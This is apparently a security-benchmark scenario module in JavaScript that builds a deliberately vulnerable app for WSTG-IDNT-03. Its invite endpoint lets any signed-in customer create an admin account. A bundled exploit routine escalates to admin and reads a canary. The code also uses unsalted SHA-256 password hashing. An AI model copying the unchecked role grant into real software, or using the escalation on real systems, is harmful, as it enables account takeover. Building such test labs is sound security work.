// WSTG-IDNT-03 (4.3.3) — Account Provisioning behaviour.
//
// Postgres-backed user store. Public signup grants the customer role.
// The invite endpoint accepts a role field from any authenticated user
// WITHOUT checking the caller's privilege ceiling — the vulnerability.
// A customer can call /invite and create themself an admin account, log
// in as that admin, and read the admin-only endpoint that returns the
// canary.
//
// The bug surface is the provisioning endpoint specifically. Auth itself
// is enforced correctly (admin-only endpoint refuses non-admin sessions);
// the role grants are correctly scoped. The provisioning function trusts
// too much — exactly the WSTG-IDNT-03 framing.

import crypto from 'node:crypto'
import { Scenario } from './scenario.mjs'

function hashPassword(pw) {
  return crypto.createHash('sha256').update(pw).digest('hex')
}

export const classDef = {
  wstgId: 'WSTG-IDNT-03',
  class: 'Account Provisioning Process',
  defenceTiers: [0],
  Scenario,
  requiresDatabase: true,
  supportsSignup: true,
  needsSignup: true,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.inviteFormPath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.inviteFormPath),

  // Single users table — id, email, password_hash, role.
  async initSchema({ db }) {
    await db.query(`DROP TABLE IF EXISTS pr_users CASCADE`)
    await db.query(`CREATE TABLE pr_users (
      id              SERIAL PRIMARY KEY,
      email           TEXT UNIQUE NOT NULL,
      password_hash   TEXT NOT NULL,
      role            TEXT NOT NULL,
      session_id      TEXT
    )`)
  },

  // Default email-only signup is fine here — we don't need a custom form.
  // Public signup always assigns customerRoleKey. (The invite endpoint is
  // what would let you escalate; that's the vuln we're testing.)
  async onSignup({ db, sessionId, rawScenario, signupData }) {
    const scenario = Scenario.parse(rawScenario)
    const email = signupData.email || `user_${sessionId.slice(0, 8)}@example.com`
    // A throwaway password — sessions track auth; the password is only used
    // by the alternate-login path the validator uses to log in as the newly
    // invited admin account.
    const password = 'tester'
    await db.query(
      `INSERT INTO pr_users (email, password_hash, role, session_id)
       VALUES ($1, $2, $3, $4)
       ON CONFLICT (email) DO UPDATE SET session_id = EXCLUDED.session_id`,
      [email, hashPassword(password), scenario.customerRoleKey, sessionId]
    )
    return {}
  },

  matchesRequest({ reqUrl, req, scenario }) {
    if (reqUrl.pathname === scenario.inviteFormPath && (req.method === 'GET' || req.method === 'POST')) return true
    if (reqUrl.pathname === scenario.invitePath && req.method === 'POST') return true
    if (reqUrl.pathname === scenario.adminDataPath && req.method === 'GET') return true
    if (reqUrl.pathname === '/login' && (req.method === 'GET' || req.method === 'POST')) return true
    return false
  },

  async handleRequest({ req, reqUrl, scenario, session, db, helpers, renderPage, manifest }) {
    // ── /login ──────────────────────────────────────────────────────
    // Lets the invited admin (created via /invite below) actually log in
    // and use their session. Email + password form.
    if (reqUrl.pathname === '/login') {
      if (req.method === 'GET') {
        return { status: 200, body: renderPage(renderLoginForm()) }
      }
      const form = new URLSearchParams(helpers.rawBody || '')
      const email = (form.get('email') || '').trim()
      const password = form.get('password') || ''
      const res = await db.query(`SELECT id, password_hash, role FROM pr_users WHERE email = $1`, [email])
      if (res.rows.length === 0 || res.rows[0].password_hash !== hashPassword(password)) {
        return { status: 401, body: renderPage(renderLoginForm('Invalid credentials.')) }
      }
      const sid = 'sess_' + crypto.randomBytes(12).toString('hex')
      await db.query(`UPDATE pr_users SET session_id = $1 WHERE email = $2`, [sid, email])
      return {
        status: 302,
        headers: {
          Location: scenario.postSignupLandingPath,
          'Set-Cookie': `session=${sid}; Path=/; HttpOnly; SameSite=Lax`,
        },
        body: '',
      }
    }

    // ── /invite form (GET) ──────────────────────────────────────────
    if (reqUrl.pathname === scenario.inviteFormPath && req.method === 'GET') {
      if (!session) {
        return { status: 302, headers: { Location: '/signup' }, body: '' }
      }
      const me = await db.query(`SELECT role FROM pr_users WHERE session_id = $1`, [session])
      if (me.rows.length === 0) {
        return { status: 302, headers: { Location: '/signup' }, body: '' }
      }
      return { status: 200, body: renderPage(renderInviteForm(scenario)) }
    }

    // ── /invite (POST) — THE VULN ─────────────────────────────────────
    // Checks that the caller is authenticated. Does NOT check that the
    // caller is allowed to grant the requested role. Anyone can create
    // a new account at any role. WSTG-IDNT-03 in one bug.
    if (reqUrl.pathname === scenario.invitePath && req.method === 'POST') {
      if (!session) {
        return { status: 401, body: renderPage('<section style="max-width:520px;margin:48px auto;text-align:center"><h1>Sign in required</h1></section>') }
      }
      const me = await db.query(`SELECT role FROM pr_users WHERE session_id = $1`, [session])
      if (me.rows.length === 0) {
        return { status: 401, body: renderPage('<section style="max-width:520px;margin:48px auto;text-align:center"><h1>Sign in required</h1></section>') }
      }
      const form = new URLSearchParams(helpers.rawBody || '')
      const email = (form.get('email') || '').trim()
      const password = (form.get('password') || 'tester').trim() || 'tester'
      const role = (form.get('role') || scenario.customerRoleKey).trim()
      if (!email) {
        return { status: 400, body: renderPage('<section style="max-width:520px;margin:48px auto;text-align:center"><h1>Email required</h1></section>') }
      }
      // VULN: no check that the caller's role allows them to assign `role`.
      await db.query(
        `INSERT INTO pr_users (email, password_hash, role) VALUES ($1, $2, $3) ON CONFLICT (email) DO UPDATE SET role = EXCLUDED.role`,
        [email, hashPassword(password), role]
      )
      return {
        status: 200,
        body: renderPage(`<section style="max-width:520px;margin:48px auto;text-align:center">
          <h1>Invite sent</h1>
          <p>Account created for <code>${escapeHtml(email)}</code> with role <strong>${escapeHtml(role)}</strong>.</p>
          <p><a href="/login">Sign in as the new teammate</a></p>
        </section>`),
      }
    }

    // ── /admin/data — properly admin-gated (the bug is NOT here) ─────
    if (reqUrl.pathname === scenario.adminDataPath && req.method === 'GET') {
      if (!session) {
        return { status: 302, headers: { Location: '/login' }, body: '' }
      }
      const me = await db.query(`SELECT role FROM pr_users WHERE session_id = $1`, [session])
      if (me.rows.length === 0 || me.rows[0].role !== scenario.adminRoleKey) {
        return {
          status: 403,
          body: renderPage(`<section style="max-width:520px;margin:48px auto;text-align:center"><h1>Forbidden</h1><p>Admin role required.</p></section>`),
        }
      }
      return {
        status: 200,
        body: renderPage(scenario.adminDataBody.replaceAll('{CANARY}', manifest.perDeployCanary)),
      }
    }

    return { status: 404, body: '' }
  },

  // Validator: signup (gets customer session) → POST /invite with role=admin
  // → fetch /login form not needed, login directly via POST with cred → fetch
  // adminDataPath → recover canary.
  async fireExploit({ baseUrl, scenario, helpers }) {
    // 1. Customer signup (uses the runtime's default email-only signup).
    const customerCookie = await helpers.signup({ email: 'customer@test.local' })
    if (!customerCookie) return { status: 0, body: '(signup failed)' }
    // 2. Provision an admin via the bug.
    const adminEmail = 'attacker_admin@test.local'
    const adminPw = 'fooBarBaz123'
    const inviteRes = await fetch(`${baseUrl}${scenario.invitePath}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: customerCookie },
      body: `email=${encodeURIComponent(adminEmail)}&password=${encodeURIComponent(adminPw)}&role=${encodeURIComponent(scenario.adminRoleKey)}`,
    })
    if (inviteRes.status !== 200) return { status: inviteRes.status, body: await inviteRes.text() }
    // 3. Log in as the new admin.
    const loginRes = await fetch(`${baseUrl}/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `email=${encodeURIComponent(adminEmail)}&password=${encodeURIComponent(adminPw)}`,
      redirect: 'manual',
    })
    const setCookie = loginRes.headers.get('set-cookie') || ''
    const m = setCookie.match(/session=([^;]+)/)
    if (!m) return { status: loginRes.status, body: '(no admin session cookie)' }
    const adminCookie = `session=${m[1]}`
    // 4. Read the admin-only endpoint.
    const r = await fetch(`${baseUrl}${scenario.adminDataPath}`, { headers: { Cookie: adminCookie } })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function renderInviteForm(scenario) {
  return `<section style="max-width:560px;margin:48px auto;padding:24px">
    <h1 style="margin:0 0 8px;font-size:24px">${escapeHtml(scenario.inviteFormCopy.heading)}</h1>
    <p style="color:#666;margin:0 0 16px">${escapeHtml(scenario.inviteFormCopy.intro)}</p>
    <form method="POST" action="${escapeAttr(scenario.invitePath)}" style="display:flex;flex-direction:column;gap:12px">
      <label style="display:flex;flex-direction:column;gap:4px">
        <span style="font-size:13px">Teammate email</span>
        <input type="email" name="email" required style="padding:8px 10px;border:1px solid #ccc;border-radius:6px;font-size:14px">
      </label>
      <label style="display:flex;flex-direction:column;gap:4px">
        <span style="font-size:13px">Initial password</span>
        <input type="text" name="password" value="welcome123" style="padding:8px 10px;border:1px solid #ccc;border-radius:6px;font-size:14px">
      </label>
      <label style="display:flex;flex-direction:column;gap:4px">
        <span style="font-size:13px">Role</span>
        <select name="role" style="padding:8px 10px;border:1px solid #ccc;border-radius:6px;font-size:14px">
          <option value="${escapeAttr(scenario.customerRoleKey)}">${escapeHtml(scenario.customerRoleLabel)}</option>
          <option value="${escapeAttr(scenario.adminRoleKey)}">${escapeHtml(scenario.adminRoleLabel)}</option>
        </select>
      </label>
      <button type="submit" style="padding:10px 14px;background:#1c1917;color:white;border:none;border-radius:6px;font-size:14px;cursor:pointer">${escapeHtml(scenario.inviteFormCopy.ctaLabel)}</button>
    </form>
  </section>`
}

function renderLoginForm(errorMsg = '') {
  const err = errorMsg ? `<p style="color:#b00;margin:0 0 12px">${escapeHtml(errorMsg)}</p>` : ''
  return `<section style="max-width:420px;margin:48px auto;padding:24px">
    <h1 style="margin:0 0 8px;font-size:24px">Sign in</h1>
    ${err}
    <form method="POST" action="/login" style="display:flex;flex-direction:column;gap:12px">
      <label style="display:flex;flex-direction:column;gap:4px">
        <span style="font-size:13px">Email</span>
        <input type="email" name="email" required style="padding:8px 10px;border:1px solid #ccc;border-radius:6px;font-size:14px">
      </label>
      <label style="display:flex;flex-direction:column;gap:4px">
        <span style="font-size:13px">Password</span>
        <input type="password" name="password" required style="padding:8px 10px;border:1px solid #ccc;border-radius:6px;font-size:14px">
      </label>
      <button type="submit" style="padding:10px 14px;background:#1c1917;color:white;border:none;border-radius:6px;font-size:14px;cursor:pointer">Sign in</button>
    </form>
  </section>`
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
function escapeAttr(s) { return escapeHtml(s).replace(/"/g, '&quot;') }
